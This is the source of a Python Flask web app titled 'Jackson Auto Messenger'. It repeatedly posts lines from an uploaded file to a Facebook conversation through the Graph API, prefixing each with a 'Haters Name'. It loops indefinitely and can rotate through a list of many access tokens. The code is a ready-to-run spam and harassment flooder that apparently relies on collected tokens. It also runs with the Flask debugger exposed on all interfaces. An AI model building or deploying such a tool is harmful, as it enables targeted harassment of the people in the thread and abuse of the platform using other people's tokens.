from flask import Flask, request, render_template_string
import threading
import requests
import os
import time

app = Flask(__name__)
app.debug = True

# Global flag to stop background process
running = False

headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9',
}


# ---------------- BACKGROUND SEND FUNCTION ---------------- #

def send_single_token(access_token, thread_id, mn, time_interval, messages):
    global running
    running = True

    while running:
        try:
            for msg in messages:
                if not running:
                    break

                api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                message = f"{mn} {msg}"

                params = {'access_token': access_token, 'message': message}
                r = requests.post(api_url, data=params, headers=headers)

                print("SENT:", message, "STATUS:", r.status_code)
                time.sleep(time_interval)

        except Exception as e:
            print("ERROR:", e)
            time.sleep(10)



def send_multi_token(tokens, thread_id, mn, time_interval, messages):
    global running
    running = True

    while running:
        try:
            for token in tokens:
                for msg in messages:
                    if not running:
                        break

                    api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                    message = f"{mn} {msg}"

                    params = {'access_token': token, 'message': message}
                    r = requests.post(api_url, data=params, headers=headers)

                    print("SENT USING:", token[:10], "MSG:", message, "STATUS:", r.status_code)
                    time.sleep(time_interval)

        except Exception as e:
            print("ERROR:", e)
            time.sleep(10)


# ---------------------- START PROCESS ---------------------- #

@app.route('/start', methods=['POST'])
def start_sending():
    global running

    if running:
        return "❌ Already Running!"

    token_type = request.form.get('tokenType')
    access_token = request.form.get('accessToken')
    thread_id = request.form.get('threadId')
    mn = request.form.get('kidx')
    time_interval = int(request.form.get('time'))

    txt_file = request.files['txtFile']
    messages = txt_file.read().decode().splitlines()

    # Multi token
    if token_type == "multi":
        token_file = request.files['tokenFile']
        tokens = token_file.read().decode().splitlines()

        t = threading.Thread(
            target=send_multi_token,
            args=(tokens, thread_id, mn, time_interval, messages)
        )
        t.daemon = True
        t.start()
        return "✅ MULTI TOKEN PROCESS STARTED"

    # Single token
    else:
        t = threading.Thread(
            target=send_single_token,
            args=(access_token, thread_id, mn, time_interval, messages)
        )
        t.daemon = True
        t.start()
        return "✅ SINGLE TOKEN PROCESS STARTED"



# ---------------------- STOP PROCESS ---------------------- #

@app.route('/stop')
def stop_sending():
    global running
    running = False
    return "⛔ PROCESS STOPPED SUCCESSFULLY"


# ---------------------- MAIN UI ---------------------- #

@app.route('/')
def home():
    return render_template_string("""

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Jackson 😈 Transparent UI</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">

    <style>
        body {
            background:black;
            color:#55ff00;
            font-family:Courier New;
        }
        .custom-input {
            background:transparent;
            border:2px solid #55ff00;
            color:#55ff00;
        }
        .custom-btn {
            background:#ff0055;
            border:2px solid yellow;
            color:white;
        }
    </style>
</head>

<body class="p-4">

    <h2 class="text-center">😈 Jackson Auto Messenger</h2>

    <form action="/start" method="POST" enctype="multipart/form-data">

        <select class="form-control custom-input" name="tokenType" id="tokenType">
            <option value="single">Single Token</option>
            <option value="multi">Multi Token</option>
        </select>

        <br>

        <div id="singleToken">
            <input type="text" name="accessToken" placeholder="Access Token" class="form-control custom-input">
        </div>

        <div id="multiToken" style="display:none;">
            <input type="file" name="tokenFile" accept=".txt" class="form-control custom-input">
        </div>

        <br>

        <input type="text" name="threadId" placeholder="Thread ID" class="form-control custom-input" required>
        <input type="text" name="kidx" placeholder="Haters Name" class="form-control custom-input" required>
        
        <input type="file" name="txtFile" accept=".txt" class="form-control custom-input" required>
        <input type="number" name="time" min="1" placeholder="Interval (Seconds)" class="form-control custom-input" required>

        <br>

        <button class="btn custom-btn w-100">🚀 START</button>
    </form>

    <br>

    <form action="/stop">
        <button class="btn btn-danger w-100">⛔ STOP</button>
    </form>

    <script>
        document.getElementById('tokenType').addEventListener('change', function() {
            const type = this.value;
            document.getElementById('singleToken').style.display = type === "single" ? "block" : "none";
            document.getElementById('multiToken').style.display = type === "multi" ? "block" : "none";
        });
    </script>

</body>
</html>

    """)



if __name__ == '__main__':
    port = int(os.environ.get('PORT', 21096))
    app.run(host='0.0.0.0', port=port, debug=True)
